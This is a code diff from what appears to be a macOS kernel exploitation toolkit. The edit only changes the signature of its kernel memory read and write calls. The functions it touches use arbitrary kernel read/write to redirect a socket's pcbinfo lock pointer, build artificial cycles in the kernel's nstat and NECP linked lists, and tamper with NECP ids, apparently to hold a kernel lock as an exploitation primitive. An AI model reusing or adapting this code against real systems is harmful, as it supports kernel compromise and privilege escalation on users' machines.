@@ -45,37 +45,37 @@ void xe_util_lck_rw_set_lock(xe_util_lck_rw_t util) {
     xe_assert(util->inp_pcbinfo != 0);
     xe_assert(util->so_pcb != 0);
     uintptr_t new_inp_pcbinfo = util->lck - TYPE_INPCBINFO_MEM_IPI_LOCK_OFFSET;
-    xe_assert(xe_kmem_read_uint64(KMEM_OFFSET(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET)) == util->inp_pcbinfo);
-    xe_kmem_write_uint64(KMEM_OFFSET(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET), new_inp_pcbinfo);
+    xe_assert(xe_kmem_read_uint64(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET) == util->inp_pcbinfo);
+    xe_kmem_write_uint64(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET, new_inp_pcbinfo);
 }
 
 void xe_util_lck_rw_restore_lock(xe_util_lck_rw_t util) {
     xe_assert(util->inp_pcbinfo != 0);
     xe_assert(util->so_pcb != 0);
-    xe_kmem_write_uint64(KMEM_OFFSET(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET), util->inp_pcbinfo);
+    xe_kmem_write_uint64(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET, util->inp_pcbinfo);
 }
 
 void xe_util_lck_create_nstat_controls_cycle(xe_util_lck_rw_t util) {
     xe_assert(util->nstat_controls_head != 0);
     xe_assert(util->nstat_controls_tail != 0);
-    xe_assert(xe_kmem_read_uint64(KMEM_OFFSET(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET)) == 0);
-    xe_kmem_write_uint64(KMEM_OFFSET(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET), util->nstat_controls_head);
+    xe_assert(xe_kmem_read_uint64(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET) == 0);
+    xe_kmem_write_uint64(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET, util->nstat_controls_head);
 }
 
 void xe_util_lck_break_nstat_controls_cycle(xe_util_lck_rw_t util) {
     xe_assert(util->nstat_controls_head != 0);
     xe_assert(util->nstat_controls_tail != 0);
-    xe_assert(xe_kmem_read_uint64(KMEM_OFFSET(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET)) == util->nstat_controls_head);
-    xe_kmem_write_uint64(KMEM_OFFSET(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET), 0);
+    xe_assert(xe_kmem_read_uint64(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET) == util->nstat_controls_head);
+    xe_kmem_write_uint64(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET, 0);
 }
 
 void xe_util_lck_read_nstat_controls_state(xe_util_lck_rw_t util) {
     xe_assert(util->nstat_controls_head == 0);
     xe_assert(util->nstat_controls_tail == 0);
-    uintptr_t head = xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_NSTAT_CONTROLS_ADDR));
+    uintptr_t head = xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_NSTAT_CONTROLS_ADDR), 0);
     uintptr_t tail = head;
     while (TRUE) {
-        uintptr_t next = xe_kmem_read_uint64(KMEM_OFFSET(tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET));
+        uintptr_t next = xe_kmem_read_uint64(tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET);
         if (next == 0) {
             break;
         } else {
@@ -91,15 +91,15 @@ void xe_util_lck_read_nstat_controls_state(xe_util_lck_rw_t util) {
 void xe_util_lck_create_necp_mapping_cycle(xe_util_lck_rw_t util) {
     xe_assert(util->necp_uuid_id_mapping_head != 0);
     xe_assert(util->necp_uuid_id_mapping_tail != 0);
-    xe_assert(xe_kmem_read_uint64(KMEM_OFFSET(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET)) == 0);
-    xe_kmem_write_uint64(KMEM_OFFSET(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET), util->necp_uuid_id_mapping_head);
+    xe_assert(xe_kmem_read_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET) == 0);
+    xe_kmem_write_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET, util->necp_uuid_id_mapping_head);
 }
 
 void xe_util_lck_break_necp_mapping_cycle(xe_util_lck_rw_t util) {
     xe_assert(util->necp_uuid_id_mapping_head != 0);
     xe_assert(util->necp_uuid_id_mapping_tail != 0);
-    xe_assert(xe_kmem_read_uint64(KMEM_OFFSET(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET)) == util->necp_uuid_id_mapping_head);
-    xe_kmem_write_uint64(KMEM_OFFSET(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET), 0);
+    xe_assert(xe_kmem_read_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET) == util->necp_uuid_id_mapping_head);
+    xe_kmem_write_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET, 0);
 }
 
 void xe_util_lck_invalidate_necp_ids(xe_util_lck_rw_t util) {
@@ -107,10 +107,10 @@ void xe_util_lck_invalidate_necp_ids(xe_util_lck_rw_t util) {
     xe_assert(util->necp_uuid_id_mapping_tail != 0);
     uintptr_t cursor = util->necp_uuid_id_mapping_head;
     do {
-        uint32_t id = xe_kmem_read_uint32(KMEM_OFFSET(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET));
+        uint32_t id = xe_kmem_read_uint32(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET);
         xe_assert_cond(id, <=, MAX_NECP_UUID_MAPPING_ID);
-        xe_kmem_write_uint64(KMEM_OFFSET(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET), UINT16_MAX - id);
-        cursor = xe_kmem_read_uint64(KMEM_OFFSET(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET));
+        xe_kmem_write_uint64(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET, UINT16_MAX - id);
+        cursor = xe_kmem_read_uint64(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET);
         xe_assert(cursor != 0);
     } while (cursor != util->necp_uuid_id_mapping_tail);
 }
@@ -120,10 +120,10 @@ void xe_util_lck_restore_necp_ids(xe_util_lck_rw_t util) {
     xe_assert(util->necp_uuid_id_mapping_tail != 0);
     uintptr_t cursor = util->necp_uuid_id_mapping_head;
     do {
-        uint32_t id = xe_kmem_read_uint32(KMEM_OFFSET(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET));
+        uint32_t id = xe_kmem_read_uint32(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET);
         xe_assert_cond(id, >=, UINT16_MAX - MAX_NECP_UUID_MAPPING_ID);
-        xe_kmem_write_uint64(KMEM_OFFSET(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET), UINT16_MAX - id);
-        cursor = xe_kmem_read_uint64(KMEM_OFFSET(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET));
+        xe_kmem_write_uint64(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_ID_OFFSET, UINT16_MAX - id);
+        cursor = xe_kmem_read_uint64(cursor, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET);
         xe_assert(cursor != 0);
     } while (cursor != util->necp_uuid_id_mapping_tail);
 }
@@ -131,10 +131,10 @@ void xe_util_lck_restore_necp_ids(xe_util_lck_rw_t util) {
 void xe_util_lck_read_necp_uuid_id_mapping_state(xe_util_lck_rw_t util) {
     xe_assert(util->necp_uuid_id_mapping_head == 0);
     xe_assert(util->necp_uuid_id_mapping_tail == 0);
-    uintptr_t head = xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_NECP_UUID_ID_MAPPING_HEAD_ADDR));
+    uintptr_t head = xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_NECP_UUID_ID_MAPPING_HEAD_ADDR), 0);
     uintptr_t tail = head;
     while (TRUE) {
-        uintptr_t next = xe_kmem_read_uint64(KMEM_OFFSET(tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET));
+        uintptr_t next = xe_kmem_read_uint64(tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET);
         if (next == 0) {
             break;
         } else {
@@ -169,8 +169,8 @@ xe_util_lck_rw_t xe_util_lck_rw_lock_exclusive(uintptr_t proc, uintptr_t lock) {
     int error = xe_xnu_proc_find_fd_data(proc, sock_fd, &socket);
     xe_assert_err(error);
     
-    uintptr_t inpcb = xe_kmem_read_uint64(KMEM_OFFSET(socket, TYPE_SOCKET_MEM_SO_PCB_OFFSET));
-    uintptr_t inp_pcbinfo = xe_kmem_read_uint64(KMEM_OFFSET(inpcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET));
+    uintptr_t inpcb = xe_kmem_read_uint64(socket, TYPE_SOCKET_MEM_SO_PCB_OFFSET);
+    uintptr_t inp_pcbinfo = xe_kmem_read_uint64(inpcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET);
     
     xe_util_lck_rw_t util = (xe_util_lck_rw_t)malloc(sizeof(struct xe_util_lck_rw));
     bzero(util, sizeof(*util));
@@ -209,7 +209,7 @@ void xe_util_lck_rw_lock_done(xe_util_lck_rw_t* util) {
     // assign different laddr (other than loopback)
     struct in6_addr new_laddr;
     memset(&new_laddr, 0xab, sizeof(new_laddr));
-    xe_kmem_write(KMEM_OFFSET((*util)->so_pcb, TYPE_INPCB_MEM_INP_DEPENDLADDR_OFFSET), &new_laddr, sizeof(new_laddr));
+    xe_kmem_write((*util)->so_pcb, TYPE_INPCB_MEM_INP_DEPENDLADDR_OFFSET, &new_laddr, sizeof(new_laddr));
     
     xe_util_lck_invalidate_necp_ids(*util);
     xe_util_lck_create_necp_mapping_cycle(*util);
